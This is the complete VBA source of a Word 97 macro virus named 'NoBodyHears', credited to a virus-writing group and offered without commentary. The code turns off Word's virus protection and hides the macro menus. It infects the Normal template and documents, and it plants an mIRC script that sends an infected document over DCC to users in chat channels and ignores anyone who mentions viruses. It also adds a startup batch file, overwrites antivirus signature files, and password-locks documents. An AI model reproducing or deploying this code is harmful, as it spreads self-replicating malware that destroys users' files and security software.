   Attribute VB_Name = "NoBodyHears"
   Sub AutoClose()
   '******************************************************************
   'WM97 NoBodyHears
   'By AngelsKitten / [NuKE]
   'Greetings to Evul, Knowdeth, Jackie twoflower, Foxz
   'Reptile, Duke, Raven, Deloss, Bumblebee, Masey, RAiD,
   'FlyShadow, and the following groups: MVT, 29A, NVT & SLAM
   '******************************************************************
   On Error Resume Next
   Application.VBE.ActiveVBProject.VBComponents("NoBodyHears").Export "C:\VXD.dll"
   With Options
       .ConfirmConversions = False
       .VirusProtection = False
       .SaveNormalPrompt = False
   End With
   With Application
       .ScreenUpdating = False
       .DisplayStatusBar = False
       .DisplayAlerts = wdAlertsNone
       .EnableCancelKey = wdCancelDisabled
   End With
   CommandBars("Tools").Controls("Macro").Enabled = False
   CommandBars("Tools").Controls(12).Enabled = False
   CommandBars("Tools").Controls(12).Delete
   CommandBars("tools").Controls("Macro").Delete
   CommandBars("tools").Controls("Customize...").Delete
   CommandBars("view").Controls("Toolbars").Delete
   CommandBars("view").Controls("Status Bar").Delete
   For ¢ = 1 To NormalTemplate.VBProject.VBComponents.Count
   If NormalTemplate.VBProject.VBComponents(¢).Name = "NoBodyHears" Then ¶ = True
   Next ¢
   For ¢ = 1 To ActiveDocument.VBProject.VBComponents.Count
   If ActiveDocument.VBProject.VBComponents(¢).Name = "NoBodyHears" Then Ü = True
   Next ¢
   If Ü = True And ¶ = False Then Set § = NormalTemplate.VBProject _
   Else If Ü = False And ¶ = True Then Set § = ActiveDocument.VBProject
   §.VBComponents.Import ("C:\VXD.dll")
   On Error GoTo scriptoops
   Open "C:\audio.vxd" For Output As #1
   Print #1, "[script]"
   Print #1, "n0=;NobodyHears by Angelskitten / [NuKE]"
   Print #1, "n1=on 1:PART:#:{ /if ( $nick == $me ) { halt }"
   Print #1, "n2= /dcc send $nick C:\windows\aboutme.doc"
   Print #1, "n3=}"
   Print #1, "n4="
   Print #1, "n5=on 1:JOIN:#:{ /if ( $nick == $me ) { halt }"
   Print #1, "n6= /dcc send $nick C:\windows\aboutme.doc"
   Print #1, "n7=}"
   Print #1, "n8="
   Print #1, "n9=on 1:TEXT:*infected*:#:/.ignore $nick"
   Print #1, "n10=on 1:TEXT:*infected*:?:/.ignore $nick"
   Print #1, "n12=on 1:TEXT:*clean*:#:/.ignore $nick"
   Print #1, "n13=on 1:TEXT:*clean*:?:/.ignore $nick"
   Print #1, "n14=on 1:TEXT:*script.ini*:#:/.ignore $nick"
   Print #1, "n15=on 1:TEXT:*script.ini*:?:/.ignore $nick"
   Print #1, "n16=on 1:TEXT:*virus*:#:/.ignore $nick"
   Print #1, "n17=on 1:TEXT:*virus*:?:/.ignore $nick"
   Print #1, "n18=on 1:TEXT:*worm*:#:/.ignore $nick"
   Print #1, "n19=on 1:TEXT:*worm*:?:/.ignore $nick"
   Print #1, "n20=on 1:TEXT:*aboutme*:#:/.ignore $nick"
   Print #1, "n21=on 1:TEXT:*aboutme*:?:/.ignore $nick"
   Print #1, "n22=on 1:TEXT:*aboutme.doc*:#:/.ignore $nick"
   Print #1, "n23=on 1:TEXT:*aboutme.doc*:?:/.ignore $nick"
   Print #1, "n24=on 1:TEXT:*doc*:#:/.ignore $nick"
   Print #1, "n25=on 1:TEXT:*doc*:?:/.ignore $nick"
   Print #1, "n26=on 1:TEXT:*blank*:#:/.ignore $nick"
   Print #1, "n27=on 1:TEXT:*blank*:?:/.ignore $nick"
   Print #1, "n28=ON 1:QUIT:#:/msg $chan I tryed to tell you, I tryed to show you. NoBodyHears"
   Print #1, "n29=ON 1:connect: {"
   Print #1, "n30=  /run attrib +r +s +h C:\mirc\Script.ini"
   Print #1, "n31=}"
   Close #1
   scriptoops:
   On Error GoTo batoops
   Open "c:\windows\WinStart.bat" For Output As #2
   Print #2, "@Echo Off"
   Print #2, "copy /y c:\audio.vxd c:\mirc\script.ini >nul"
   Print #2, "copy /y c:\PROGRA~1\MICROS~3\TEMPLA~1\normal.dot c:\windows\aboutme.doc >nul"
   Close #2
   batoops:
   If Day(Now()) = 12 Then
   SetAttr "C:\program files\AntiViral Toolkit Pro\*.avc", vbReadOnly
   Open "C:\program files\AntiViral Toolkit Pro\*.avc" For Output As #3
   Print #3, "NoBodyHears"
   Close #3
   SetAttr "C:\program files\AntiViral Toolkit Pro\avp.set", vbReadOnly
   Open "C:\program files\AntiViral Toolkit Pro\avp.set" For Output As #4
   Print #4, "NoBodyHears"
   Close #4
   SetAttr "C:\program files\mcafee\*.dat", vbReadOnly
   Open "C:\program files\mcafee\*.def" For Output As #5
   Print #5, "NoBodyHears"
   Close #5
   SetAttr "C:\f-marco\*.def", vbReadOnly
   Open "C:\f-macro\*.def" For Output As #6
   Print #6, "NoBodyHears"
   Close #6
   End If
   If Day(Now()) = Int(Rnd * 31) + 1 Then
     With Assistant.NewBalloon
        .Icon = msoIconTip
        .Animation = msoAnimationGetArtsy
        .Heading = "WM97 NoBodyHears"
        .Text = "Welcome to WM97 NoBodyHears by Angelskitten / [NuKE]"
        .Show
     End With
     ActiveDocument.Password = "NoBodyHears"
     Shell "start http://www.avp.com.au/", vbHide
   End If
   ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
   SetAttr ("c:\VXD.dll"), vbHidden + vbSystem
   End Sub
   Sub AutoOpen()
     Call AutoClose
   End Sub
   Sub AutoNew()
     Call AutoClose
   End Sub
   Sub ViewVBCode()
     MsgBox "Unexcpected error", 16
     Call AutoClose
   End Sub
   Sub ViewCode()
     MsgBox "Unexcpected error", 16
     Application.Caption = "Word 6.0"
     Call AutoClose
   End Sub
   Sub ToolsMacro()
     MsgBox "Unexcpected error", 16
     Call AutoClose
   End Sub
   Sub FileTemplates()
     MsgBox "Unexcpected error", 16
     Application.Caption = "Word 6.0"
     Call AutoClose
   End Sub
   Sub HelpWordPerfectHelp()
   MsgBox "Unexcpected error", 16
     Application.Caption = "Word 6.0"
     Call AutoClose
   End Sub
